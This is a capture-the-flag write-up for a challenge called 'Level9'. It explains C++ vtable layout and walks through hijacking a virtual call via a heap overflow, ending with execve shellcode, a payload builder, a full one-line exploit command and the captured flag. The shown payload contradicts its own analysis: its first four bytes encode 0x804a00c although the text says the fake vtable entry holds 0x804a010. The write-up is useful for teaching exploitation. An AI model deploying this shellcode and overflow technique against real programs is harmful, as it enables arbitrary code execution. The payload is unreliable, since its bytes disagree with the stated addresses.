# Level9 - C++ Virtual Table Hijacking: Detailed Analysis

## Table of Contents
1. [Overview](#overview)
2. [C++ Object Memory Layout](#cpp-object-memory-layout)
3. [Virtual Function Mechanism](#virtual-function-mechanism)
4. [The Vulnerability](#the-vulnerability)
5. [Heap Memory Layout](#heap-memory-layout)
6. [Exploitation Strategy](#exploitation-strategy)
7. [Payload Construction](#payload-construction)
8. [Step-by-Step Execution](#step-by-step-execution)
9. [Why This Works](#why-this-works)
10. [Key Takeaways](#key-takeaways)

---

## Overview

**Challenge Type**: C++ Virtual Table (vtable) Hijacking  
**Difficulty**: Advanced  
**Technique**: Heap Buffer Overflow + Function Pointer Hijacking  
**Target**: Redirect virtual function call to shellcode

Level9 demonstrates advanced C++ exploitation by hijacking the virtual function table mechanism through a heap buffer overflow.

---

## C++ Object Memory Layout

### Understanding C++ Objects with Virtual Functions

When a C++ class has virtual functions, the compiler adds a hidden pointer as the **first member** of the object:

```cpp
class N {
    // HIDDEN: void *__vtable_ptr;  ← Added by compiler (offset 0x00)
    char annotation[100];            // Offset 0x04
    int value;                       // Offset 0x68
};
```

### Memory Layout of Class N

```
Offset | Size | Member        | Description
-------|------|---------------|----------------------------------
0x00   | 4    | vtable_ptr    | Pointer to virtual function table
0x04   | 100  | annotation    | Character buffer (vulnerable!)
0x68   | 4    | value         | Integer value
-------|------|---------------|----------------------------------
Total: 108 bytes (0x6c)
```

### Visual Representation

```
┌─────────────────────────────────────────────────┐
│              N Object (108 bytes)               │
├──────────┬──────────────────────────┬───────────┤
│ vtable   │   annotation[100]        │   value   │
│ pointer  │   (vulnerable buffer)    │   (int)   │
│ 4 bytes  │   100 bytes              │  4 bytes  │
└──────────┴──────────────────────────┴───────────┘
   ↓
   Points to vtable
```

---

## Virtual Function Mechanism

### How Virtual Functions Work

#### 1. The Virtual Table (vtable)

Each class with virtual functions has a **vtable** - a table of function pointers:

```
Class N's vtable (at 0x08048848):
┌─────────────────┐
│ operator+ addr  │ → 0x080485f4
├─────────────────┤
│ operator- addr  │ → 0x08048610
└─────────────────┘
```

#### 2. Virtual Function Call

When you call a virtual function:

```cpp
result = (*second) + (*first);  // Calls second->operator+(first)
```

The CPU performs these steps:

```
Step 1: Read vtable pointer from object
    vtable_ptr = *(void **)second;  // Read first 4 bytes

Step 2: Read function pointer from vtable
    func_ptr = *(void **)vtable_ptr;  // Read first entry

Step 3: Call the function
    func_ptr(second, first);  // Execute with arguments
```

#### 3. Assembly Representation

```assembly
mov eax, [second]        ; Load vtable pointer
mov edx, [eax]           ; Load function pointer from vtable
push first               ; Push second argument
push second              ; Push first argument (this)
call edx                 ; Call the function
```

#### 4. Decompiled Representation

Ghidra shows this as:
```c
(**eax_1)(eax_1, eax)
```

Which breaks down to:
- `eax_1` = second object pointer
- `*eax_1` = vtable pointer (dereference object)
- `**eax_1` = function pointer (dereference vtable)
- `(**eax_1)(...)` = call the function

---

## The Vulnerability

### Vulnerable Function

```cpp
void N::setAnnotation(char *input) {
    size_t len = strlen(input);
    memcpy(this->annotation, input, len);  // NO BOUNDS CHECKING!
}
```

### The Problem

1. **No size limit**: `memcpy` copies `strlen(input)` bytes
2. **Buffer is 100 bytes**: `annotation` can only hold 100 bytes
3. **Adjacent object**: Second object is right after first on heap
4. **Overflow possible**: Input > 100 bytes overwrites second object

### What Can Be Overwritten

```
First object overflow can reach:
- Padding after first object
- Second object's vtable pointer  ← TARGET!
- Second object's annotation buffer
- Second object's value
```

---

## Heap Memory Layout

### Allocation Details

```cpp
N *first = new N(5);   // operator new(0x6c) → 108 bytes
N *second = new N(6);  // operator new(0x6c) → 108 bytes
```

### Actual Heap Layout

```
Address     | Content                              | Description
------------|--------------------------------------|---------------------------
0x804a008   | [vtable ptr: 0x08048848]            | First object vtable
0x804a00c   | [annotation buffer - 100 bytes]     | First object data
0x804a070   | [value: 5]                          | First object value
0x804a074   | [padding - 4 bytes]                 | Heap alignment
------------|--------------------------------------|---------------------------
0x804a078   | [vtable ptr: 0x08048848]            | Second object vtable ← TARGET
0x804a07c   | [annotation buffer - 100 bytes]     | Second object data
0x804a0e0   | [value: 6]                          | Second object value
```

### Distance Calculation

```
First object:  0x804a008
Second object: 0x804a078
Distance:      0x804a078 - 0x804a008 = 0x70 (112 bytes)

To overwrite second's vtable:
- First object starts at offset 0
- First object's annotation starts at offset 4
- Need to write 108 bytes from annotation start
- Bytes 108-111 overwrite second's vtable pointer
```

---

## Exploitation Strategy

### The Attack Plan

1. **Create fake vtable** in first object's data
2. **Place shellcode** after fake vtable
3. **Overflow** to overwrite second's vtable pointer
4. **Trigger** virtual function call on second object
5. **Execute** shellcode

### Memory Layout After Exploit

```
0x804a008: [original vtable] ← First object (unchanged)
0x804a00c: [0x804a010]       ← Fake vtable entry (points to shellcode)
0x804a010: [shellcode...]    ← Our shellcode (28 bytes)
0x804a02c: [AAAA...]         ← Padding (76 bytes)
0x804a078: [0x804a00c]       ← Second object vtable (OVERWRITTEN!)
```

### Execution Flow

```
1. Call: (*second) + (*first)
2. Read second's vtable: 0x804a00c (our fake vtable!)
3. Read function pointer from 0x804a00c: 0x804a010 (our shellcode!)
4. Jump to 0x804a010
5. Execute shellcode
6. Spawn /bin/sh
```

---

## Payload Construction

### Payload Structure

```
Total: 112 bytes

[Fake vtable entry][Shellcode][Padding][Vtable overwrite]
 4 bytes            28 bytes   76 bytes 4 bytes
```

### Detailed Breakdown

```python
# Part 1: Fake vtable entry (4 bytes)
fake_vtable = "\x0c\xa0\x04\x08"  # Points to shellcode at 0x804a010

# Part 2: Shellcode (28 bytes)
shellcode = (
    "\x31\xc0"              # xor eax, eax
    "\x50"                  # push eax (NULL)
    "\x68\x2f\x2f\x73\x68"  # push "//sh"
    "\x68\x2f\x62\x69\x6e"  # push "/bin"
    "\x89\xe3"              # mov ebx, esp ("/bin//sh")
    "\x89\xc1"              # mov ecx, eax (NULL)
    "\x89\xc2"              # mov edx, eax (NULL)
    "\xb0\x0b"              # mov al, 0x0b (execve)
    "\xcd\x80"              # int 0x80
    "\x31\xc0"              # xor eax, eax
    "\x40"                  # inc eax (exit)
    "\xcd\x80"              # int 0x80
)

# Part 3: Padding (76 bytes)
padding = "A" * 76

# Part 4: Vtable overwrite (4 bytes)
vtable_overwrite = "\x0c\xa0\x04\x08"  # Points to our fake vtable

# Complete payload
payload = fake_vtable + shellcode + padding + vtable_overwrite
```

### Address Calculations

```
First object:           0x804a008
First object + 4:       0x804a00c  ← Fake vtable location
First object + 8:       0x804a010  ← Shellcode location
Second object:          0x804a078
Second object vtable:   0x804a078  ← Overwrite target

Fake vtable entry:      0x804a010  (points to shellcode)
Vtable overwrite value: 0x804a00c  (points to fake vtable)
```

---

## Step-by-Step Execution

### Before Exploit

```
First object (0x804a008):
[0x08048848][annotation: empty][value: 5]

Second object (0x804a078):
[0x08048848][annotation: empty][value: 6]
```

### After setAnnotation(payload)

```
First object (0x804a008):
[0x08048848][0x804a010][shellcode...][AAAA...]

Second object (0x804a078):
[0x804a00c][annotation: ...][value: 6]
         ↑
         Overwritten!
```

### Virtual Function Call

```
Step 1: return (*second) + (*first);
Step 2: vtable_ptr = *(void **)0x804a078 = 0x804a00c
Step 3: func_ptr = *(void **)0x804a00c = 0x804a010
Step 4: call 0x804a010  ← SHELLCODE!
```

---

## Why This Works

### 1. NX Disabled (No Execute Protection)

```bash
$ checksec level9
NX disabled
```

**Impact**: Heap memory is executable, allowing shellcode to run.

### 2. No ASLR

Heap addresses are predictable:
- First object always at `0x804a008`
- Second object always at `0x804a078`

### 3. No Vtable Verification

No check if vtable pointer or function pointer is valid - direct jump to whatever address is in the vtable.

---

## Key Takeaways

### C++ Security Concepts

1. **Vtable pointer is the first member** of every object with virtual functions
2. **Virtual function calls use double indirection**: object → vtable → function
3. **Corrupting vtable pointer = complete control** over execution

### Exploitation Techniques

1. **Fake vtable construction** - Only need first entry pointing to shellcode
2. **In-object shellcode storage** - Store fake vtable AND shellcode in same object
3. **Precise overflow control** - Exactly 108 bytes to reach vtable

### Security Lessons

1. **Always bounds-check memory operations**
2. **Use safe C++ practices** (std::string, smart pointers)
3. **Enable modern protections** (NX, ASLR, CFI)
4. **Understand C++ internals** to write secure code

---

## Complete Exploit

```bash
./level9 `python -c 'print("\x0c\xa0\x04\x08" +
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" +
    "\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" +
    "A"*76 + "\x0c\xa0\x04\x08")'`
```

---

## Flag

```
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
